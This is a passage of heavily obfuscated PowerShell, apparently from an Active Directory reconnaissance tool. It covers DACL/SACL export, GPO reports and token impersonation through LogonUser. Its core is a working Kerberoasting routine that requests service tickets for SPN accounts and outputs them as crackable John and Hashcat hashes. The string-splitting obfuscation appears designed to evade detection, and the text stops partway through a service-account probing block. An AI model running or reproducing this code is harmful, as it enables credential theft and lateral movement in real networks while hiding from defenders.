            &("{1}{0}{2}"-f'rn','Write-Wa','ing') ("{16}{15}{1}{8}{10}{3}{2}{7}{11}{0}{13}{6}{9}{5}{4}{14}{12}{17}" -f'i','et-ADRACL] ','er','enum','in','ta','R','a','Error w','oot Con','hile ','t','r Ob','ng ','e','G','[','jects')
            &("{0}{3}{1}{2}"-f 'W','Ver','bose','rite-') "[EXCEPTION] $($_.Exception.Message) "
        }
        ${O`BJS`EA`RcheR}.("{0}{2}{1}" -f 'd','spose','i').Invoke()

        If (${oB`JS})
        {
            &("{3}{0}{1}{4}{2}" -f 'ite-Verb','o','e','Wr','s') "[*] Total Objects: $([ADRecon.LDAPClass]::ObjectCount($Objs)) "
            &("{0}{2}{1}"-f'Write-','se','Verbo') ("{0}{1}{2}{3}"-f '[-',']',' DA','CLs')
            ${Dac`l`ObJ} =  (  vAriaBLE olxe).vAlUe::("{1}{2}{0}"-f 'Parser','D','ACL').Invoke(${O`BJs}, ${G`U`IDs}, ${Thr`eADS})
            &("{1}{0}{2}"-f 'e-Verbos','Writ','e') ("{3}{4}{0}{6}{1}{5}{2}{7}"-f ' nee','ge','Accoun','[-] SACLs -',' May','d ','d a Privile','t')
            ${S`ACLo`BJ} =   $oLxE::("{0}{1}{2}" -f 'S','ACLPa','rser').Invoke(${O`BjS}, ${gU`IDS}, ${t`HrEAds})
            &("{4}{2}{3}{1}{0}" -f'le','iab','emove-Va','r','R') ("{1}{0}"-f 's','Obj')
            &("{0}{2}{1}" -f'Remo','-Variable','ve') ("{1}{0}" -f 's','GUID')
        }
    }

    If (${D`Acl`ObJ})
    {
        &("{0}{2}{1}" -f'E','rt-ADR','xpo') ${D`Ac`lobj} ${a`DrO`UtPU`Tdir} ${oUtP`Ut`TyPE} ("{1}{0}" -f 's','DACL')
        &("{0}{4}{1}{2}{3}" -f 'Rem','-Va','r','iable','ove') ("{2}{0}{1}" -f'LO','bj','DAC')
    }

    If (${S`AcLOBj})
    {
        &("{1}{0}{3}{2}"-f 'x','E','t-ADR','por') ${s`AClo`BJ} ${AdrO`UTp`UtDir} ${O`UTpUt`Type} ("{1}{0}"-f 'Ls','SAC')
        &("{2}{4}{0}{3}{1}" -f 'ov','-Variable','R','e','em') ("{0}{1}{2}" -f'SAC','L','Obj')
    }
}

Function g`et-a`DRgP`OrEPo`RT
{

    param(
        [Parameter(MAndAtORY = ${TR`Ue})]
        [string] ${m`ET`hod},

        [Parameter(manDAtory = ${t`Rue})]
        [bool] ${u`sE`A`LtCrEDS},

        [Parameter(MaNDAtoRy = ${t`RUe})]
        [string] ${aD`RO`U`TPuTdIr}
    )

    If (${mE`T`hOD} -eq ("{0}{1}"-f'A','DWS'))
    {
        Try
        {
            
            ${s`Av`e`VErBosEprEfe`REN`ce} = ${s`C`RIpT:vE`RbOs`E`PReFe`ReNce}
            ${s`C`R`I`PT:V`erBosePREfEREnCe} = ("{1}{0}{2}{3}"-f'i','S','l','entlyContinue')

            If (${PsV`eR`s`iO`NTABlE}."p`SeD`ITion" -eq ("{1}{0}" -f'ore','C'))
            {
                &("{1}{0}{2}{3}"-f'mpor','I','t-M','odule') ("{1}{0}{3}{2}"-f 'roupPol','G','y','ic') -SkipEditionCheck -WarningAction ("{1}{0}" -f 'op','St') -ErrorAction ("{0}{1}" -f 'Sto','p') | &("{1}{0}{2}"-f 'ut-','O','Null')
            }
            Else
            {
                &("{3}{2}{0}{1}" -f 'ort','-Module','p','Im') ("{2}{1}{0}" -f'Policy','p','Grou') -WarningAction ("{1}{0}" -f'top','S') -ErrorAction ("{0}{1}"-f 'St','op') | &("{0}{1}" -f'Out','-Null')
            }
            If (${sAvE`VErb`oS`E`pR`eFERencE})
            {
                ${SCrIpT`:`VEr`Bos`EP`R`EfERen`Ce} = ${SAveverBo`Se`P`Refe`Re`NCE}
                &("{3}{2}{1}{4}{0}"-f 'e','move-Varia','e','R','bl') ("{4}{2}{3}{1}{0}{5}" -f 'ePrefer','s','Ve','rbo','Save','ence')
            }
        }
        Catch
        {
            &("{0}{1}{2}{3}" -f 'Writ','e-Wa','rni','ng') ("{12}{8}{0}{4}{9}{13}{10}{1}{5}{3}{11}{7}{2}{6}"-f'OReport]','od','Repor','le. Skippin',' Error imp','u','t','GPO','t-ADRGP','orting ','pPolicy M','g ','[Ge','the Grou')
            &("{2}{0}{3}{1}" -f'rite-','rbose','W','Ve') "[EXCEPTION] $($_.Exception.Message) "
            If (${sAVeVe`RBoS`EPref`eRE`NcE})
            {
                ${S`cR`iP`T:VerBOS`ePr`eFERE`NCE} = ${saVever`BOS`ePR`e`FERENce}
                &("{1}{2}{0}"-f 'le','Remove','-Variab') ("{3}{1}{5}{2}{0}{4}" -f 'Prefer','eVerb','e','Sav','ence','os')
            }
            Return ${Nu`LL}
        }
        Try
        {
            &("{2}{3}{1}{0}"-f 'rbose','e','Wri','te-V') ("{5}{1}{0}{4}{3}{2}" -f 'GPOR',' ','XML',' ','eport','[*]')
            ${ad`FileNA`Me} = -join(${a`droUtP`U`T`Dir},'\',("{2}{1}{0}" -f'port','Re','GPO-'),("{0}{1}"-f '.','xml'))
            &("{1}{0}{2}"-f'-G','Get','POReport') -All -ReportType ("{0}{1}"-f'XM','L') -Path ${AdfI`LenA`me}
        }
        Catch
        {
            If (${UsE`AlT`crEDS})
            {
                &("{0}{2}{3}{1}"-f'W','ning','rite-W','ar') ("{0}{1}{6}{4}{2}{3}{5}" -f '[*] Run ','the t',' ','u','ol','sing RUNAS.','o')
                &("{0}{1}{2}{3}"-f'Wri','te-Wa','r','ning') ((("{3}{11}{5}{12}{9}{6}{10}{16}{1}{15}{2}{4}{14}{13}{8}{0}{7}" -f'l','/n',' p','[*] ru','ower','omai','am','l.exe','e','sern','e','nas /user:<D','n FQDN>N4Z<U','h','s','etonly','> ')) -crEPlaCE([ChAr]78+[ChAr]52+[ChAr]90),[ChAr]92)
                Return ${N`UlL}
            }
            &("{3}{1}{4}{2}{0}"-f'g','rite-','nin','W','War') ("{12}{8}{1}{7}{5}{2}{11}{10}{0}{6}{13}{9}{3}{4}" -f 'e GPOR','GPORe',' E','t ','in XML','ort]','ep','p','t-ADR','r','ror getting th','r','[Ge','o')
            &("{3}{0}{2}{1}"-f'erbo','e','s','Write-V') "[EXCEPTION] $($_.Exception.Message) "
        }
        Try
        {
            &("{0}{2}{3}{1}"-f 'Write-V','e','erb','os') ("{0}{2}{3}{1}"-f '[*] G','ML','PORe','port HT')
            ${aD`FI`L`ENAme} = -join(${aDR`out`PuTDIr},'\',("{1}{0}{2}"-f 'ep','GPO-R','ort'),("{1}{0}"-f'tml','.h'))
            &("{2}{1}{0}{3}"-f 'PO','t-G','Ge','Report') -All -ReportType ("{0}{1}" -f'H','TML') -Path ${a`d`Fi`LeNaMe}
        }
        Catch
        {
            If (${uSE`Al`Tc`REDS})
            {
                &("{2}{3}{1}{0}" -f 'rning','Wa','Writ','e-') ("{6}{4}{5}{1}{3}{2}{0}" -f 'S.','to',' RUNA','ol using','Run the',' ','[*] ')
                &("{4}{1}{3}{2}{0}"-f 'ng','ri','arni','te-W','W') ((("{2}{1}{5}{7}{11}{8}{0}{4}{6}{10}{9}{12}{3}"-f 's',']','[*','hell.exe','ernam',' ru','e> /n','nas /user:<','QDN>{0}<U','nly p','eto','Domain F','owers')) -F [cHaR]92)
                Return ${nu`LL}
            }
            &("{1}{2}{3}{0}" -f 'ng','Wr','ite-Warn','i') ("{9}{1}{0}{6}{5}{2}{4}{8}{7}{3}" -f 'Report] Er','PO','g the G','XML','PORepor','tin','ror get','n ','t i','[Get-ADRG')
            &("{3}{1}{2}{0}" -f 'ose','rite-','Verb','W') "[EXCEPTION] $($_.Exception.Message) "
        }
    }
    If (${M`eThod} -eq ("{0}{1}" -f 'L','DAP'))
    {
        &("{1}{0}{2}" -f'arni','Write-W','ng') ("{4}{13}{15}{10}{7}{11}{12}{2}{0}{9}{8}{6}{3}{14}{5}{1}" -f'te','.','only suppor','h','[*','ADWS','t','ntly, ','i','d w','e','the modu','le is ','] ',' ','Curr')
    }
}


Function gEt-aDR`USE`R`impE`RSONAtIoN
{


    [OutputType([IntPtr])]
    [CmdletBinding(DeFaUlTParAMETeRSETNAMe = {"{1}{0}{2}" -f 'a','Credenti','l'})]
    Param(
        [Parameter(MaNDATORy = ${TR`Ue}, PArAMETErsetNaMe = "cRE`dENT`iAl")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`Re`Dential},

        [Parameter(ManDATOry = ${tr`UE}, paRAmETeRseTnAme = "TOk`eNHA`ND`le")]
        [ValidateNotNull()]
        [IntPtr]
        ${TO`K`EnhA`NDle},

        [Switch]
        ${Q`U`IET}
    )

    If (( ( lS ('vaRIAB'+'l'+'e:U2m')).vaLuE::"cURrE`N`TthreAd".("{3}{1}{0}{2}" -f 'ent','artm','State','GetAp').Invoke() -ne 'STA') -and (-not ${pS`BOuNd`p`A`RAMeTeRs}[("{1}{0}" -f 't','Quie')]))
    {
        &("{0}{2}{1}{3}"-f'Write','rnin','-Wa','g') ("{9}{4}{34}{17}{23}{26}{27}{10}{29}{36}{11}{37}{16}{20}{35}{12}{15}{19}{14}{24}{0}{6}{8}{1}{25}{30}{33}{22}{21}{31}{5}{18}{3}{32}{13}{28}{2}{7}"-f'ly in a ','e',' wor','pers','s','k','si','k.','ngl','[Get-ADRU','p','he','s no','n ma','en','t','.exe pr','pe','en im',' curr','o','ate, ','t','rsonati','t','-','on','] ','y not','owe','threaded apartment ','to','onatio','s','erIm','cess i','rs','ll')
    }

    If (${pSBouN`dp`AR`AM`e`TeRS}[("{0}{1}{2}"-f 'Tok','en','Handle')])
    {
        ${loG`O`NToke`N`hAnDLE} = ${ToKEN`hAn`D`le}
    }
    Else
    {
        ${LOGo`NtOkenh`A`N`d`lE} =   ( vaRiAblE KSEf ).VALue::"Z`eRo"
        ${NEt`WoR`k`crEdEnt`Ial} = ${cRe`DE`Nt`IAL}.("{4}{0}{1}{2}{3}" -f'o','rkCredent','i','al','GetNetw').Invoke()
        ${uSerdom`A`iN} = ${ne`TWOr`kCR`ed`ENtiAL}."dOma`in"
        If (-Not ${U`s`eRDOmAiN})
        {
            &("{2}{1}{0}" -f'e-Warning','it','Wr') ((("{3}{15}{10}{1}{7}{13}{2}{14}{0}{9}{11}{4}{5}{6}{12}{8}" -f 'n FQDN. ','e','nti','[',' FQDN>6','1Y<U','serna','rsonation] Use cred',')','(<Domai','mp','n','me>','e','al with Domai','Get-ADRUserI')) -cRePlAcE([CHAr]54+[CHAr]49+[CHAr]89),[CHAr]92)
        }
        ${u`se`Rname} = ${n`etWOrkcR`ed`ENTiAL}."Us`eRnA`mE"
        &("{3}{1}{0}{2}" -f'-Wa','rite','rning','W') "[Get-ADRUserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName) "

        
        
        ${RE`SUlt} = ${ADVaPI`32}::("{3}{0}{2}{1}"-f'g','nUser','o','Lo').Invoke(${uSeRn`A`mE}, ${U`s`erDom`AiN}, ${NE`T`WorkcREdEnt`ial}."P`AsS`wORD", 9, 3, [ref]${lOg`o`NTOk`eNHaNDLE})
        ${LASTe`R`ROr} =   (  itEm ("vA"+"RiABle:"+"GF1"+"V") ).VALUe::("{1}{3}{0}{2}" -f'2Erro','GetL','r','astWin3').Invoke();

        If (-not ${reSU`Lt})
        {
            throw "[Get-ADRUserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
        }
    }

    
    ${r`eS`ULt} = ${adV`Api32}::("{4}{1}{2}{3}{0}{5}{6}" -f 'nUs','ersona','teLogged','O','Imp','e','r').Invoke(${LoGOnto`kENHa`ND`LE})

    If (-not ${re`sU`Lt})
    {
        throw "[Get-ADRUserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &("{2}{3}{0}{1}{4}" -f'-','Verbos','Wri','te','e') ("{6}{0}{11}{20}{13}{2}{19}{16}{10}{17}{21}{18}{14}{12}{8}{1}{7}{22}{9}{15}{4}{3}{5}" -f 'Get','ti','rso','y impers','l','onated','[','als succ','n','s','] ','-ADR-Us','de','mpe','e','ful','n','Alternate','cr','natio','erI',' ','es')
    ${LOgoN`T`ok`ENHa`Nd`lE}
}


Function GEt-`ADRREV`E`RttOs`ELF
{


    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        ${t`OkENha`Ndle}
    )

    If (${p`sB`ouNdpaRAme`TERS}[("{2}{0}{1}{3}" -f 'nHa','n','Toke','dle')])
    {
        &("{2}{0}{1}{3}"-f 'rite-Warn','in','W','g') ("{8}{5}{14}{6}{10}{16}{15}{4}{9}{1}{13}{7}{0}{12}{17}{11}{18}{2}{3}"-f 'onation and ','r','ken han','dle','Self] R','Ge','-','token impers','[','eve','ADRReve',' LogonU','closi','ting ','t','o','rtT','ng','ser() to')
        ${ReSu`LT} = ${KER`NeL`32}::("{1}{2}{0}"-f'andle','Close','H').Invoke(${ToKen`HAn`d`Le})
    }

    ${rE`S`ULT} = ${a`dVapI32}::("{1}{0}{2}" -f'ever','R','tToSelf').Invoke()
    ${l`ASTerR`OR} =  $Gf1v::("{0}{2}{3}{4}{1}" -f 'G','in32Error','et','Last','W').Invoke();

    If (-not ${r`esuLt})
    {
        &("{0}{2}{1}"-f'Wri','Error','te-') "[Get-ADRRevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message) "
    }

    &("{3}{1}{0}{2}"-f 'erbo','-V','se','Write') ("{1}{8}{15}{3}{2}{7}{11}{5}{6}{12}{9}{14}{4}{10}{16}{17}{0}{13}" -f 'full','[','elf','tToS','t','ke','n i',']','Get-AD','r','i',' To','mpe','y reverted','sona','RRever','on ','success')
}


Function G`eT-ADR`SPntiC`KET
{

    param(
        [Parameter(MaNdAtorY = ${t`Rue})]
        [string] ${UsEr`s`pN}
    )

    Try
    {
        ${NU`lL} =   (CHiLdItEm  ("V"+"a"+"RIABLe:1T"+"i")  ).vaLue::("{2}{0}{4}{3}{1}{5}"-f'oadWi','am','L','alN','thParti','e').Invoke(("{0}{1}{2}{4}{3}{5}"-f'Sy','ste','m.Id','ity','ent','Model'))
        ${ti`ck`et} = &("{0}{2}{1}" -f'New','ct','-Obje') ("{13}{3}{9}{6}{4}{8}{12}{10}{14}{5}{2}{15}{1}{11}{7}{0}{16}"-f 'o','tor','rberosRequ','.Ide','ityMod','e','t','T','el.Tok','n','s.','Security','en','System','K','es','ken') -ArgumentList ${U`ser`spn}
    }
    Catch
    {
        &("{3}{0}{1}{2}" -f 'r','i','te-Warning','W') ('[Get-'+'AD'+'RSPNTic'+'ke'+'t] '+'Error'+' '+'req'+'ue'+'sting '+'t'+'ic'+'ket '+'f'+'or '+'SP'+'N '+"$UserSPN")
        &("{1}{2}{0}" -f 'rning','Write-W','a') "[EXCEPTION] $($_.Exception.Message) "
        Return ${N`Ull}
    }

    If (${T`ICK`Et})
    {
        ${t`ICKET`ByT`EstREaM} = ${tI`c`KeT}.("{0}{2}{1}" -f'Ge','Request','t').Invoke()
    }

    If (${TicketB`YtES`Tre`AM})
    {
        ${T`ICketh`eXS`Tre`AM} =  $yfvzn::("{1}{0}"-f'ng','ToStri').Invoke(${ticK`Etbyt`eS`TrEam}) -replace '-'

        
        
        If (${tICkE`TH`Exstr`EaM} -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)')
        {
            ${E`TyPe} =  $aSCoug::("{0}{1}" -f 'ToB','yte').Invoke( ${m`A`TChes}."e`T`YPelEN", 16 )
            ${C`iP`Her`TEXtl`en} =   (VarIaBlE  asCOug  -VALuE  )::("{1}{2}{0}"-f 'nt32','To','UI').Invoke(${Mat`C`hes}."cipH`eRTEx`TleN", 16)-4
            ${ciPhE`R`TExT} = ${MaTc`h`ES}."d`ATat`OENd".("{0}{1}{2}" -f 'Su','bstr','ing').Invoke(0,${CiP`hErteX`TlEN}*2)

            
            If (${ma`T`cheS}."d`ATato`end".("{0}{1}" -f'Substr','ing').Invoke(${CIphEr`Text`lEn}*2, 4) -ne ("{0}{1}"-f 'A','482'))
            {
                &("{3}{2}{1}{0}"-f'g','e-Warnin','it','Wr') ('[G'+'et-AD'+'RSPNTicke'+'t] '+'Er'+'ror'+' '+'parsi'+'ng'+' '+'c'+'ip'+'hertext'+' '+'f'+'or '+'th'+'e '+'S'+'PN '+' '+(('ydG(y'+'dGTic'+'ke'+'t.Ser'+'vi'+'c'+'ePrincip'+'a'+'lNam'+'e).')-cREplAce ([ChAR]121+[ChAR]100+[ChAR]71),[ChAR]36)) 
                ${HA`sH} = ${n`ULl}
            }
            Else
            {
                ${H`Ash} = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
            }
        }
        Else
        {
            &("{0}{1}{2}" -f'Write','-Warni','ng') "[Get-ADRSPNTicket] Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). " 
            ${Ha`sh} = ${nU`lL}
        }
    }
    ${o`Bj} = &("{0}{2}{1}" -f'New','bject','-O') ("{0}{1}" -f'PSO','bject')
    ${O`Bj} | &("{1}{0}{2}" -f 'd','Ad','-Member') -MemberType ("{0}{1}{2}" -f 'No','t','eProperty') -Name ("{6}{5}{2}{1}{0}{3}{4}"-f 'in','Pr','vice','cipal','Name','r','Se') -Value ${T`iCK`et}."SeR`VIcep`RINCIPA`l`NAmE"
    ${O`Bj} | &("{2}{1}{0}{3}" -f'-Mem','d','Ad','ber') -MemberType ("{2}{3}{1}{0}" -f 'perty','ro','Note','P') -Name ("{0}{1}"-f'Ety','pe') -Value ${Et`ype}
    ${O`BJ} | &("{2}{0}{1}"-f 'm','ber','Add-Me') -MemberType ("{0}{1}{3}{2}"-f 'Not','eProper','y','t') -Name ("{1}{0}"-f'ash','H') -Value ${h`ASH}
    Return ${O`BJ}
}

Function geT`-ADr`kER`Be`RoAsT
{

    param(
        [Parameter(MANDatORy = ${tR`UE})]
        [string] ${M`Et`HOd},

        [Parameter(MaNDaToRy = ${F`A`lse})]
        [DirectoryServices.DirectoryEntry] ${oBJ`d`oMain},

        [Parameter(MANDatORY = ${f`AlSe})]
        [Management.Automation.PSCredential] ${Crede`Nt`IAL} =  (  vARIAble ('cLF'+'0n') -vaLUeo)::"e`mPTY",

        [Parameter(MAndATorY = ${t`RUe})]
        [int] ${paG`ES`iZE}
    )

    If (${C`REDE`NTiAl} -ne  ( varIaBle  ("C"+"lF0n")).VAlUe::"eMP`Ty")
    {
        ${lo`GO`NtoK`eN} = &("{0}{1}{4}{2}{3}" -f 'Get-ADR','UserI','at','ion','mperson') -Credential ${Cr`e`DEn`TIal}
    }

    If (${ME`Thod} -eq ("{0}{1}" -f 'ADW','S'))
    {
        Try
        {
            ${a`du`sERs} = &("{1}{2}{0}"-f 'ect','Get-ADOb','j') -LDAPFilter ((("{15}{6}{11}{9}{14}{5}{0}{12}{1}{13}{3}{4}{8}{7}{10}{2}"-f 'Name=*)(','user','3:=2))','rol:1.2.84','0.','cipal','b','4','113556.1.','Class=computer)(servicePri','.80','ject','!','AccountCont','n','(&(!o'))) -Properties ("{1}{0}{2}"-f 'Acco','sAM','untName'),("{4}{2}{1}{5}{0}{3}"-f 'lNam','ic','v','e','ser','ePrincipa'),("{1}{2}{4}{3}{5}{0}"-f'e','Dist','inguis','d','he','Nam') -ResultPageSize ${PAG`E`sIzE}
        }
        Catch
        {
            &("{2}{0}{1}{3}"-f'te-W','ar','Wri','ning') ("{2}{5}{6}{12}{4}{7}{0}{9}{1}{3}{8}{10}{11}" -f'mera','ng','[',' Us','en','Get-ADRKerberoas','t] Error whil','u','er','ti','SPN O','bjects','e ')
            &("{0}{1}{2}{4}{3}" -f'Wri','t','e-','erbose','V') "[EXCEPTION] $($_.Exception.Message) "
            Return ${n`Ull}
        }

        If (${aDUsE`Rs})
        {
            ${u`se`RSPno`Bj} = @()
            ${A`DU`SeRS} | &("{0}{1}{2}" -f 'ForEa','c','h-Object') {
                ForEach (${uSeR`S`pN} in ${_}."Se`RV`iCEpRINC`IPaLnaMe")
                {
                    ${O`Bj} = &("{2}{0}{1}"-f '-','Object','New') ("{2}{0}{1}" -f 'b','ject','PSO')
                    ${O`Bj} | &("{0}{1}{2}" -f'Add-Mem','be','r') -MemberType ("{0}{3}{1}{2}"-f 'No','oper','ty','tePr') -Name ("{2}{0}{1}"-f 'ser','name','U') -Value ${_}."sA`mA`CcoUnTna`me"
                    ${o`Bj} | &("{2}{1}{0}" -f 'ber','m','Add-Me') -MemberType ("{2}{1}{0}" -f'perty','tePro','No') -Name ("{3}{4}{2}{1}{0}" -f'ePrincipalName','ic','rv','S','e') -Value ${u`seRs`PN}

                    ${HAs`h`ObJ} = &("{0}{4}{3}{2}{1}" -f 'Get','PNTicket','S','R','-AD') ${U`seRspN}
                    If (${ha`s`hOBj})
                    {
                        ${u`serDo`m`AIN} = ${_}."dIs`T`iNgU`IS`he`DnAmE".("{0}{1}{2}"-f 'Su','bStrin','g').Invoke(${_}."dISTIN`g`UI`sh`eD`NAME".("{1}{0}" -f'f','IndexO').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        
                        ${JTr`Ha`Sh} = "`$krb5tgs`$$($HashObj.ServicePrincipalName):$($HashObj.Hash)"
                        
                        ${HAS`HcAthA`SH} = "`$krb5tgs`$$($HashObj.Etype)`$*$($_.SamAccountName)`$$UserDomain`$$($HashObj.ServicePrincipalName)*`$$($HashObj.Hash)"
                    }
                    Else
                    {
                        ${j`TrH`ASh} = ${Nu`lL}
                        ${Has`HcA`Th`ASH} = ${nu`LL}
                    }
                    ${O`BJ} | &("{1}{2}{0}{3}"-f'em','Add-','M','ber') -MemberType ("{1}{2}{0}" -f 'y','No','tePropert') -Name ("{1}{0}"-f'n','Joh') -Value ${J`Tr`HASh}
                    ${o`BJ} | &("{2}{0}{1}"-f'dd-M','ember','A') -MemberType ("{2}{3}{1}{0}" -f 'ty','per','Note','Pro') -Name ("{0}{2}{1}" -f'H','t','ashca') -Value ${hAs`hCA`Thash}
                    ${uSErSPN`O`Bj} += ${O`BJ}
                }
            }
            &("{0}{4}{2}{1}{3}"-f'Remove-Va','a','i','ble','r') ("{0}{1}" -f'AD','Users')
        }
    }

    If (${m`et`hod} -eq ("{0}{1}"-f'LD','AP'))
    {
        ${objsEa`RCH`er} = &("{2}{1}{0}"-f 'ject','w-Ob','Ne') ("{5}{6}{3}{4}{7}{0}{1}{2}{9}{8}" -f'.Di','rectory','Search','t','em.','Sy','s','DirectoryServices','r','e') ${o`BJd`O`Main}
        ${oBJSEar`ch`er}."pAg`es`iZe" = ${p`AG`e`sIZe}
        ${oB`JseA`R`cher}."fI`LteR" = ((("{18}{19}{12}{20}{16}{14}{6}{13}{4}{11}{5}{10}{7}{8}{21}{22}{15}{2}{17}{0}{1}{3}{9}"-f'56','.1.4.80','.8','3:=','l','me=*)(!use','nci','untC','o','2))','rAcco','Na','ectCla','pa','ri','.2','(serviceP','40.1135','(&(','!obj','ss=computer)','ntrol',':1')))
        ${o`B`jseARch`er}."PrOpeRt`iE`Sto`lOaD".("{0}{2}{1}" -f 'Ad','Range','d').Invoke((("{0}{3}{1}{2}"-f 'disti','guishedna','me','n'),("{2}{0}{3}{1}{4}"-f'o','n','samacc','u','tname'),("{3}{4}{5}{0}{2}{1}" -f'rinci','name','pal','se','rv','icep'),("{1}{0}{5}{2}{4}{3}" -f 'ccoun','usera','o','rol','nt','tc')))
        ${OBJs`E`ArCHEr}."SE`ArcHsC`OPe" = ("{0}{1}{2}" -f'S','u','btree')
        Try
        {
            ${AdUSe`RS} = ${oB`jseaR`CHer}.("{0}{1}{2}"-f 'Fi','ndAl','l').Invoke()
        }
        Catch
        {
            &("{1}{0}{2}{4}{3}"-f 'r','W','ite-','ning','War') ("{5}{10}{4}{0}{6}{8}{1}{3}{2}{9}{12}{7}{11}" -f 'ror','n','merati','u','DRKerberoast] Er','[',' wh','bject','ile e','ng Us','Get-A','s','erSPN O')
            &("{1}{2}{0}"-f 'se','Write-Verb','o') "[EXCEPTION] $($_.Exception.Message) "
            Return ${n`ULl}
        }
        ${objSeaR`c`hER}.("{0}{2}{1}"-f 'disp','se','o').Invoke()

        If (${AD`Us`erS})
        {
            ${u`sEr`SpnO`BJ} = @()
            ${aD`U`SErs} | &("{3}{0}{2}{1}"-f 'rEach','Object','-','Fo') {
                ForEach (${U`sEr`spn} in ${_}."P`ROpErt`i`ES"."SEr`VI`ce`pRI`NCI`pAL`NAmE")
                {
                    ${o`Bj} = &("{2}{0}{1}"-f 'e','ct','New-Obj') ("{0}{2}{1}"-f'PSObj','t','ec')
                    ${O`BJ} | &("{2}{0}{1}"-f 'dd-Me','mber','A') -MemberType ("{3}{2}{0}{1}"-f 'eProp','erty','ot','N') -Name ("{1}{2}{0}"-f'ame','User','n') -Value ${_}."PrO`Per`T`IeS"."SAmAc`COUnt`NAme"[0]
                    ${O`Bj} | &("{1}{2}{0}"-f'r','Add-Me','mbe') -MemberType ("{0}{3}{1}{2}" -f 'N','ePro','perty','ot') -Name ("{1}{0}{2}{3}{4}"-f'v','Ser','ic','ePrinc','ipalName') -Value ${US`er`Spn}

                    ${h`As`HObj} = &("{2}{4}{1}{0}{3}" -f 'c','Ti','Get-AD','ket','RSPN') ${uS`e`RSpN}
                    If (${HAs`h`oBj})
                    {
                        ${u`S`er`domain} = ${_}."pRO`P`ERTi`ES"."DiS`TiNguI`Sh`eDNAMe"[0]."sUbS`Tri`NG"(${_}."proPE`RTi`ES"."di`STiNgu`iShE`DNAme"[0].("{0}{2}{1}"-f 'Ind','f','exO').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        
                        ${J`T`RhasH} = "`$krb5tgs`$$($HashObj.ServicePrincipalName):$($HashObj.Hash)"
                        
                        ${haSh`ca`TH`AsH} = "`$krb5tgs`$$($HashObj.Etype)`$*$($_.Properties.samaccountname)`$$UserDomain`$$($HashObj.ServicePrincipalName)*`$$($HashObj.Hash)"
                    }
                    Else
                    {
                        ${JTr`ha`sH} = ${n`ULl}
                        ${Ha`shCAT`HASh} = ${n`ULl}
                    }
                    ${o`Bj} | &("{0}{1}{2}"-f'Add-','Mem','ber') -MemberType ("{1}{0}{2}" -f 'Pr','Note','operty') -Name ("{1}{0}" -f 'hn','Jo') -Value ${J`TrH`ASH}
                    ${o`Bj} | &("{0}{2}{1}" -f 'Add-Mem','r','be') -MemberType ("{1}{2}{0}" -f 'perty','Not','ePro') -Name ("{0}{1}{2}" -f 'Ha','shca','t') -Value ${H`A`SHCat`haSH}
                    ${US`eRs`Pnobj} += ${O`BJ}
                }
            }
            &("{4}{1}{3}{2}{0}"-f 'e','ov','-Variabl','e','Rem') ("{1}{2}{0}" -f'ers','A','DUs')
        }
    }

    If (${LOGOnt`oK`eN})
    {
        &("{0}{1}{5}{3}{2}{4}"-f'Get','-A','o','ertT','Self','DRRev') -TokenHandle ${LoGoN`T`ok`En}
    }

    If (${USEr`s`PnO`BJ})
    {
        Return ${uS`eRsp`NoBJ}
    }
    Else
    {
        Return ${nU`Ll}
    }
}


Function gE`T-`ADrdOM`Ai`NA`C`C`ounTSUsEdf`ors`eRvic`ELoGON
{

    param(
        [Parameter(mAnDatORY = ${Tr`UE})]
        [string] ${m`e`THod},

        [Parameter(MaNDatoRy = ${fAl`SE})]
        [DirectoryServices.DirectoryEntry] ${OBJ`dOMA`In},

        [Parameter(mandAtoRY = ${F`AL`se})]
        [Management.Automation.PSCredential] ${c`ReD`EnT`ial} =   ( Get-vArIaBlE  ('c'+'lf0N') -VAluEOnLY )::"em`PTY",

        [Parameter(mAndatOry = ${t`RUE})]
        [int] ${pAg`Es`IzE} = 200,

        [Parameter(mAndAtOrY = ${f`A`lse})]
        [int] ${THr`E`AdS} = 10
    )

    BEGIN {
        ${re`ADSER`VI`cEA`cCOu`N`TS} = [scriptblock] {
            
            ${ho`stNAmE} = [string] ${a`RGS}[0]
            ${Op`eRATI`NG`Syst`Em} = [string] ${AR`gS}[1]
            
            ${C`RedE`NTial} = ${A`Rgs}[2]
            ${T`iM`EOuT} = 250
            ${PO`RT} = 135
            Try
            {
                ${TcpCl`iE`Nt} = &("{0}{2}{1}" -f 'N','ct','ew-Obje') ("{6}{3}{7}{0}{4}{2}{5}{1}"-f'ets.T','nt','l','.N','cpC','ie','System','et.Sock')
                ${R`ESUlT} = ${Tcp`CL`IEnT}.("{1}{3}{0}{2}"-f'nC','Beg','onnect','i').Invoke(${hoStN`Ame},${po`Rt},${Nu`LL},${n`ULl})
                ${Su`CcE`sS} = ${rE`SUlT}."a`SYNCwAITH`AnD`Le".("{0}{1}{2}"-f 'Wai','tOn','e').Invoke(${T`i`MEoUT},${nU`ll})
            }
            Catch
            {
                ${Warn`InG} = "$hostname ($OperatingSystem) is unreachable $($_.Exception.Message) "
                ${SucC`ESS} = ${f`AlSe}
                ${T`C`pCliENt}.("{0}{1}" -f 'Clo','se').Invoke()
            }
            If (${Su`C`CEss})
            {
                
                If (${p`SVerS`IoNTAB`le}."P`sv`eRSioN"."Ma`JOr" -ne 2)
                {
                    If (${c`REd`EntIal} -ne  $ClF0n::"e`MPty")
                    {
                        ${s`ESS`ion} = &("{0}{4}{3}{1}{2}" -f 'Ne','i','mSession','C','w-') -ComputerName ${H`OstnA`Me} -SessionOption $(&("{1}{3}{4}{0}{2}{5}{6}" -f'Sess','New-','ionOp','C','im','tio','n') -Protocol ("{0}{1}" -f'DCO','M')) -Credential ${cREd`E`Nti`AL}
                        If (${s`esS`iOn})
                        {
